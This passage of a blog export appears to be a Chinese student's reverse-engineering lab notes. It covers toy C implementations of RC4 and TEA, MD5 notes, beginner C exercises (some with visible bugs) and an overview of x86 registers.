&#123;</span><br><span class="line">			jiami[n] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">char</span> jiemi[<span class="number">100</span>]=<span class="string">&quot;\0&quot;</span>;</span><br><span class="line">	jiemi[<span class="number">99</span>]=<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">	base58jiemi(jiemi,huifu256(huifu10(jiami,n<span class="number">-1</span>)));</span><br><span class="line">	<span class="built_in">puts</span>(jiemi+e);</span><br><span class="line">	&#125;;<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="RC4"><a href="#RC4" class="headerlink" title="RC4"></a>RC4</h2><p>通过特定规律（不同key不同规律）打乱数组，因所用的char为signedchar有128种，所以此处进行128字节加密</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line">#include&lt;string.h&gt;</span><br><span class="line">int panduanweishu(int a)//判断key数位数，方便填充T表</span><br><span class="line">&#123;</span><br><span class="line">    int b,c;</span><br><span class="line">    for(b=1,c=10;1;b++,c*=10)</span><br><span class="line">    &#123;</span><br><span class="line">        if(a/c==0)</span><br><span class="line">        return b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">void anweitianchongKbiao(int *T,int b,int weishu)//对T表进行填充</span><br><span class="line">&#123;</span><br><span class="line">int a,c;</span><br><span class="line">for(a=weishu-1,c=10;a&gt;=0;a--,c*=10)</span><br><span class="line">&#123;</span><br><span class="line">    T[a]=b%c-b%(c/10);</span><br><span class="line">&#125;</span><br><span class="line">for(a=weishu;a&lt;128;a++)</span><br><span class="line">&#123;</span><br><span class="line">    T[a]=T[a%weishu];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">void swap(int *a,int x,int y)</span><br><span class="line">&#123;</span><br><span class="line">   a[x]=a[x]^a[y];</span><br><span class="line">   a[y]=a[x]^a[y];</span><br><span class="line">   a[x]=a[x]^a[y];</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int S[128],T[128],a,b,c,d,key;</span><br><span class="line">    char jiami[100],jiemi[100];</span><br><span class="line">    printf(&quot;请选择加密或解密 0/1:&quot;);</span><br><span class="line">    scanf(&quot;%d&quot;,&amp;a);</span><br><span class="line">    getchar();</span><br><span class="line">    switch(a)</span><br><span class="line">    &#123;</span><br><span class="line">    case 0:&#123;</span><br><span class="line">    printf(&quot;请输入待加密字符&quot;);</span><br><span class="line">    gets(jiami);</span><br><span class="line">    printf(&quot;请输入初始KEY&quot;);</span><br><span class="line">    scanf(&quot;%d&quot;,&amp;key);</span><br><span class="line">    getchar();</span><br><span class="line">    for(a=0;a&lt;128;a++)</span><br><span class="line">    &#123;</span><br><span class="line">        S[a]=a;//初始化S表</span><br><span class="line">    &#125;</span><br><span class="line">    anweitianchongKbiao(T,key,panduanweishu(key));</span><br><span class="line">    for(a=0,b=0;a&lt;128;a++)</span><br><span class="line">    &#123;</span><br><span class="line">        b=(b+S[a]+T[a])%128;//通过T表提供顺序进行打乱S表</span><br><span class="line">        swap(S,a,b);//打乱操作</span><br><span class="line">    &#125;</span><br><span class="line">    //取得密钥,同时加密 </span><br><span class="line">    for(a=0,b=0,c=0;a&lt;strlen(jiami);a++)//此处都为取得密码流操作对字符进行异或</span><br><span class="line">    &#123;</span><br><span class="line">        b=(b+1)%128;</span><br><span class="line">        c=(c+S[b])%128;</span><br><span class="line">        swap(S,b,c);</span><br><span class="line">        d=(S[b]+S[c])%128;</span><br><span class="line">        key=S[d];</span><br><span class="line">        jiami[a]=jiami[a]^key;</span><br><span class="line">    &#125;</span><br><span class="line">    puts(jiami);</span><br><span class="line">    &#125;break;</span><br><span class="line">    case 1:&#123;</span><br><span class="line">     printf(&quot;请输入待解密字符&quot;);//解密过程是通过相同的异或操作恢复原来的数据</span><br><span class="line">    gets(jiami);</span><br><span class="line">    printf(&quot;请输入初始KEY&quot;);</span><br><span class="line">    scanf(&quot;%d&quot;,&amp;key);</span><br><span class="line">    getchar();</span><br><span class="line">    for(a=0;a&lt;128;a++)</span><br><span class="line">    &#123;</span><br><span class="line">        S[a]=a;</span><br><span class="line">    &#125;</span><br><span class="line">    anweitianchongKbiao(T,key,panduanweishu(key));</span><br><span class="line">    for(a=0,b=0;a&lt;128;a++)</span><br><span class="line">    &#123;</span><br><span class="line">        b=(b+S[a]+T[a])%128;//通过T表提供顺序进行打乱S表</span><br><span class="line">        swap(S,a,b);//打乱操作</span><br><span class="line">    &#125;</span><br><span class="line">    for(a=0,b=0,c=0;a&lt;strlen(jiami);a++)</span><br><span class="line">    &#123;</span><br><span class="line">        b=(b+1)%128;</span><br><span class="line">        c=(c+S[b])%128;</span><br><span class="line">        swap(S,b,c);</span><br><span class="line">        d=(S[b]+S[c])%128;</span><br><span class="line">        key=S[d];</span><br><span class="line">        jiami[a]=(unsigned char)jiami[a]^key;//通过异或相同的数来使其恢复</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    puts(jiami);</span><br><span class="line">    &#125;break;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="Tea"><a href="#Tea" class="headerlink" title="Tea"></a>Tea</h2><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">teajiami</span> <span class="params">(<span class="type">uint32_t</span>* v, <span class="type">uint32_t</span>* k)</span> <span class="comment">//此处uint32长度就为usigned int占32bit共4个字节</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint32_t</span> sum = <span class="number">0</span>;  <span class="comment">// 注意sum也是32位无符号整型</span></span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>];</span><br><span class="line">    <span class="type">uint32_t</span> delta = <span class="number">0x9e3779b9</span>;</span><br><span class="line">    <span class="type">uint32_t</span> k0 = k[<span class="number">0</span>], k1 = k[<span class="number">1</span>], k2 = k[<span class="number">2</span>], k3 = k[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">32</span>; i++) <span class="comment">//进行32轮迭代，次数越多越难破解，但同时效率也会降低</span></span><br><span class="line">    &#123;</span><br><span class="line">        sum += delta;</span><br><span class="line">        v0 += ((v1&lt;&lt;<span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="number">5</span>) + k1);<span class="comment">//此处可以作为检验tea加密的突破口，移位运算结合异或运算</span></span><br><span class="line">        v1 += ((v0&lt;&lt;<span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="number">5</span>) + k3);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    v[<span class="number">0</span>]=v0; </span><br><span class="line">    v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">teajiemi</span> <span class="params">(<span class="type">uint32_t</span>* v, <span class="type">uint32_t</span>* k)</span> <span class="comment">//解密也是进行相同的异或操作，通过异或同一个数恢复原数</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>];</span><br><span class="line">    <span class="type">uint32_t</span> delta = <span class="number">0x9e3779b9</span>;</span><br><span class="line">    <span class="type">uint32_t</span> sum = delta * <span class="number">32</span>;</span><br><span class="line">    <span class="type">uint32_t</span> k0 = k[<span class="number">0</span>], k1 = k[<span class="number">1</span>], k2 = k[<span class="number">2</span>], k3 = k[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">32</span>; i++) &#123;</span><br><span class="line">        v1 -= ((v0&lt;&lt;<span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="number">5</span>) + k3);</span><br><span class="line">        v0 -= ((v1&lt;&lt;<span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="number">5</span>) + k1);</span><br><span class="line">        sum -= delta;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    v[<span class="number">0</span>]=v0; </span><br><span class="line">    v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 两个32位无符号整数，即待加密的64bit明文数据</span></span><br><span class="line">    <span class="type">uint32_t</span> v[<span class="number">2</span>] = &#123;<span class="number">0x12345678</span>, <span class="number">0x78563412</span>&#125;;</span><br><span class="line">    <span class="comment">// 四个32位无符号整数，即128bit的key</span></span><br><span class="line">    <span class="type">uint32_t</span> k[<span class="number">4</span>]= &#123;<span class="number">0x1</span>, <span class="number">0x2</span>, <span class="number">0x3</span>, <span class="number">0x4</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Data is : %x %x\n&quot;</span>, v[<span class="number">0</span>], v[<span class="number">1</span>]);</span><br><span class="line">    teajiami(v, k);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Encrypted data is : %x %x\n&quot;</span>, v[<span class="number">0</span>], v[<span class="number">1</span>]);</span><br><span class="line">    teajiemi(v, k);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Decrypted data is : %x %x\n&quot;</span>, v[<span class="number">0</span>], v[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="XXTEA"><a href="#XXTEA" class="headerlink" title="XXTEA"></a>XXTEA</h2><p>待做，特征为加密轮数由加密个数决定</p>
<h3 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h3><p>md5主要用于校验文件（不同的文件生成的md5码不同，通过检测传输前后的md5码可以检测其是否被篡改）</p>
<p>MD5可以将信息以512位来处理信息</p>
<p>主要是让信息长度比512的整数倍少64位（记录数据长度），若不足则进行填充（由一个一和对应的后续一段0表示）</p>
<p>再将对应的信息分块，每块有512位，再将每块再分为16个32位</p>
<p>用四组幻数进行循环计算（可用于检验是否位为MD5算法）</p>
<p>另外检验MD5算法一般可以看见较长的函数运算语句</p>
]]></content>
      <categories>
        <category>Re</category>
        <category>实验室报告</category>
      </categories>
  </entry>
  <entry>
    <title>学习报告（一到二周）</title>
    <url>/2023/01/05/Re/%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8A%A5%E5%91%8A/%E5%AD%A6%E4%B9%A0%E6%8A%A5%E5%91%8A%EF%BC%88%E4%B8%80%E5%88%B0%E4%BA%8C%E5%91%A8%EF%BC%89/</url>
    <content><![CDATA[<h1 id="学习报告（一到二周）"><a href="#学习报告（一到二周）" class="headerlink" title="学习报告（一到二周）"></a>学习报告（一到二周）</h1><h3 id="语言学习"><a href="#语言学习" class="headerlink" title="语言学习"></a>语言学习</h3><h4 id="汇编语言"><a href="#汇编语言" class="headerlink" title="汇编语言"></a>汇编语言</h4><p>已基本了解其使用语法，及其功能（函数调用，返回父函数）</p>
<p>mov，jmp，push，pop（基本语句）</p>
<p>call（调用子函数），ret（返回父函数），leave（将栈中的指向子函数地址去除，恢复父函数指令）</p>
<h4 id="stack用法"><a href="#stack用法" class="headerlink" title="stack用法"></a>stack用法</h4><p>存储函数在内存中的位置，存储变量，存储命令等</p>
<h4 id="C语言"><a href="#C语言" class="headerlink" title="C语言"></a>C语言</h4><p>基本理解指针用法（用于指向变量地址），可用于子函数中调用外部变量,也可用于间接修改和间接引用对应地址的值</p>
<h3 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h3><h4 id="ida静态分析"><a href="#ida静态分析" class="headerlink" title="ida静态分析"></a>ida静态分析</h4><p>通过解ctf题逐步理解</p>
<p>基本可以看懂其伪代码表示意思</p>
<p>基本会搜索相应输出结果以找到目标程序</p>
<h3 id="评测作业"><a href="#评测作业" class="headerlink" title="评测作业"></a>评测作业</h3><h4 id="1，交换数值"><a href="#1，交换数值" class="headerlink" title="1，交换数值"></a>1，交换数值</h4><p>(1)指针</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">change</span> <span class="params">(<span class="type">int</span>* a, <span class="type">int</span>* b)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> m;</span><br><span class="line">	m = *a;</span><br><span class="line">	*a = *b;</span><br><span class="line">	*b = m;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> a, b;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;b);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;a=%d,b=%d&quot;</span>, a, b);</span><br><span class="line">	change (&amp;a, &amp;b);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;a=%d,b=%d&quot;</span>, a, b);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>(2)+-交换</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> a = <span class="number">1</span>, b = <span class="number">2</span>;</span><br><span class="line">	a = a + b;</span><br><span class="line">	b = a - b;</span><br><span class="line">	a = a - b;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;a=%d,b=%d&quot;</span>, a, b);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>(3)异或(利用两次异或后为原值)</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a=<span class="number">1</span>;b=<span class="number">2</span>;</span><br><span class="line">    a = a^b;</span><br><span class="line">    b = a^b;</span><br><span class="line">    a = a^b;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a=%d,b=%d&quot;</span>a,b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="2，汇编角度分析switch语句"><a href="#2，汇编角度分析switch语句" class="headerlink" title="2，汇编角度分析switch语句"></a>2，汇编角度分析switch语句</h4><p>switch相当于一个子函数，每个case对应命令地址，所有的case按我们在c语言中写出的顺序排序，switch寻找对应case名对应的地址，将IP移向对应地址再进行相应命令，根据IP进行一次命令后+一个命令长度，就会按顺序执行命令。</p>
<p>只要不遇到break就不会退出该子函数。</p>
<h4 id="3，位运算判断奇偶数"><a href="#3，位运算判断奇偶数" class="headerlink" title="3，位运算判断奇偶数"></a>3，位运算判断奇偶数</h4><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a=&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a);</span><br><span class="line">    <span class="keyword">if</span>(a&amp;<span class="number">1</span>==<span class="number">0</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;a是一个偶数&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;a是一个奇数&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>直接通过最后一位是否为1判断奇偶数，因为除第一位其他都为2的多少次方倍</p>
<h4 id="4，"><a href="#4，" class="headerlink" title="4，"></a>4，</h4><h5 id="选择排序（）"><a href="#选择排序（）" class="headerlink" title="选择排序（）"></a>选择排序（）</h5><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">change</span> <span class="params">(<span class="type">int</span>* a, <span class="type">int</span>* b)</span><span class="comment">//交换数字</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> m;</span><br><span class="line">	m = *a;</span><br><span class="line">	*a = *b;</span><br><span class="line">	*b = m;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">   a[]=&#123;<span class="number">6</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>&#125;;</span><br><span class="line">   <span class="type">int</span> i,j;</span><br><span class="line">   <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (j = i; j &lt; =<span class="number">5</span>; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (a[j] &lt; a[i])</span><br><span class="line">				change(&amp;a[j], &amp;a[i]);\\交换数值</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">5</span>; i++)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%3d&quot;</span>, a[i]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h5 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h5><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">change</span> <span class="params">(<span class="type">int</span>* a, <span class="type">int</span>* b)</span><span class="comment">//交换数字</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> m;</span><br><span class="line">	m = *a;</span><br><span class="line">	*a = *b;</span><br><span class="line">	*b = m;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> a[<span class="number">10000</span>],n,m,c,o;</span><br><span class="line"><span class="keyword">for</span> (n = <span class="number">0</span>; n &lt;= <span class="number">10000</span>; n++)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[n]);</span><br><span class="line">	<span class="keyword">if</span> (getchar() == <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (m = n<span class="number">-1</span>; m &gt;= <span class="number">0</span>; m--)<span class="comment">//依次将最高位移向最右端</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">for</span> ( o= <span class="number">0</span>;o &lt;= m; o++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (a[o] &gt; a[o + <span class="number">1</span>])</span><br><span class="line">		&#123;</span><br><span class="line">			change(&amp;a[o],a[o+<span class="number">1</span>])</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">	<span class="keyword">for</span> (o = <span class="number">0</span>; o &lt;= n; o++)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%-3d&quot;</span>, a[o]);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></div>

<h5 id="二分寻找"><a href="#二分寻找" class="headerlink" title="二分寻找"></a>二分寻找</h5><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">search</span><span class="params">(<span class="type">int</span>* arr, <span class="type">int</span> p, <span class="type">int</span> q, <span class="type">int</span> ele)</span> </span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> mid = <span class="number">0</span>;</span><br><span class="line">	<span class="comment">//如果[p,q] 不存在，返回 -1</span></span><br><span class="line">	<span class="keyword">if</span> (p &gt; q) </span><br><span class="line">    &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 找到中间元素所在的位置</span></span><br><span class="line">	mid = p + (q - p) / <span class="number">2</span>;</span><br><span class="line">	<span class="comment">//递归的出口</span></span><br><span class="line">	<span class="keyword">if</span> (ele == arr[mid]) </span><br><span class="line">    &#123;</span><br><span class="line">		<span class="keyword">return</span> mid;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//比较 ele 和 arr[mid] 的值，缩小 ele 可能存在的区域</span></span><br><span class="line">	<span class="keyword">if</span> (ele &lt; arr[mid]) </span><br><span class="line">    &#123;</span><br><span class="line">		<span class="comment">//新的搜索区域为 [p,mid-1]</span></span><br><span class="line">		<span class="keyword">return</span> search(arr, p, mid - <span class="number">1</span>, ele);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">    &#123;</span><br><span class="line">		<span class="comment">//新的搜索区域为 [mid+1,q]</span></span><br><span class="line">		<span class="keyword">return</span> search(arr, mid + <span class="number">1</span>, q, ele);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> a[<span class="number">10</span>] = &#123; <span class="number">10</span>,<span class="number">14</span>,<span class="number">19</span>,<span class="number">26</span>,<span class="number">27</span>,<span class="number">31</span>,<span class="number">33</span>,<span class="number">35</span>,<span class="number">42</span>,<span class="number">44</span> &#125;;<span class="comment">//二分法首先得排序</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,search(a, <span class="number">0</span>, <span class="number">9</span>, <span class="number">31</span>));</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h5 id="5，出的题目"><a href="#5，出的题目" class="headerlink" title="5，出的题目"></a>5，出的题目</h5><p>目测需要动态调试，没寻找到对应的地址，不太会做</p>
<h3 id="学习目标"><a href="#学习目标" class="headerlink" title="学习目标"></a>学习目标</h3><p>仍需多加练习CTF</p>
<p>仍需多了解加密算法如base64及更高级的算法</p>
]]></content>
      <categories>
        <category>Re</category>
        <category>实验室报告</category>
      </categories>
  </entry>
  <entry>
    <title>汇编语言调试</title>
    <url>/2023/01/05/Re/%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8A%A5%E5%91%8A/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E8%B0%83%E8%AF%95/</url>
    <content><![CDATA[<h1 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h1><p>在动态调试中需知道各寄存器意义及作用</p>
<p>寄存器分为两类，通用寄存器和特殊寄存器。</p>
<h2 id="通用寄存器"><a href="#通用寄存器" class="headerlink" title="通用寄存器"></a>通用寄存器</h2><ul>
<li>EAX（寄存器寄存器-累加器）：最常用于算术，逻辑和数据传输指令、乘法和除法运算使用此寄存器。对于Windows API函数，函数的返回值通常将存储在EAX寄存器中。</li>
<li>EBX（基址寄存器）：EBX寄存器可以直接访问存储器数据，它也是一个通用寄存器。</li>
<li>ECX（计数寄存器）：ECX是一个共享寄存器，可以用作各种命令的计数器。它还可能包含内存中的数据未对齐。使用计数器的命令是顺序，循环和LOOP &#x2F; LOOPD指令。</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">//LOOP/LOOPD</span><br><span class="line">//格式如下</span><br><span class="line">LOOP 标号（）</span><br><span class="line">//可以实现函数的循环，</span><br><span class="line">//具体如下</span><br><span class="line">ECX=ECX-1</span><br><span class="line">(ECX)&lt;&gt;0//就转移至所跟的标号处执行，相当于又把EIP移到标号处</span><br><span class="line">ECX=0//就将EIP移向下一个指令(跟指令正常执行一样)</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221224210257432.png"
                      alt="image-20221224210257432"
                ></p>
<p>具体模式如下网址</p>
<p>[实模式、保护模式、三种地址、分段、分页 - 克拉默与矩阵 - 博客园 (cnblogs.com)](<a class="link"   href="https://www.cnblogs.com/kelamoyujuzhen/p/10555924.html#:~:text=%E5%AE%9E%E6%A8%A1%E5%BC%8F%EF%BC%88real" >https://www.cnblogs.com/kelamoyujuzhen/p/10555924.html#:~:text=实模式（real <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> mode），也称为实地址模式（real address mode），是所有x86兼容CPU下的一种操作模式。 实模式的特点是20 bit分段内存（segmented memory）地址空间（精确到1,MB的可寻址内存）以及 对所有可寻址内存，I%2FO地址和外设硬件的无限制直接软件访问。 实模式不支持内存保护（memory protection），多任务处理（multitasking）或 代码权限级别（code privilege levels）。)</p>
<p>可能以后要用先在这写着</p>
<ul>
<li>EDX（数据寄存器）：是一个通用寄存器，用于包含乘法结果或除法结果的一部分。它还可以直接访问内存中的数据地址。</li>
<li>EDI（目标索引）：EDI通常用于处理字符串或数组的工作。该寄存器将指向目标字符串。此外它也是一个通用寄存器。</li>
<li>ESI（源索引）：与EDI一样，ESI也经常用于处理字符串或数组的操作。该寄存器将指向源字符串。</li>
<li>EBP（基本指针）：EBP指向内存位置，除了被共享外，还用作访问函数堆栈中的参数和局部变量的帧指针。</li>
<li>ESP（堆栈指针）：该寄存器始终指向当前堆栈顶部。根据堆栈的工作原理，该寄存器将被定向到低位地址。</li>
</ul>
<h2 id="特殊寄存器"><a href="#特殊寄存器" class="headerlink" title="特殊寄存器"></a>特殊寄存器</h2><ul>
<li><p>EIP（指令指针）：这是一个特殊的寄存器，它始终指向要执行的下一条指令。与其他寄存器不同，EIP不受指令直接影响。</p>
</li>
<li><p>EFLAGS（32位时，如果为64位程序，则高32保留低32位跟32时的一致）（标志寄存器），每个位都是用来反映操作的特定状态，根据计算结果启用这些标志寄存器，并根据这些标志来执行程序的执行分支。</p>
</li>
</ul>
<div class="highlight-container" data-rel="Markdown"><figure class="iseeu highlight markdown"><table><tr><td class="code"><pre><span class="line">该寄存器第1,3,5,15,22~31位被保留(总是设定为指定的值)（可能是为以后扩展所用）</span><br></pre></td></tr></table></figure></div>

<p>标志寄存器（未保留的位）可分为三部分</p>
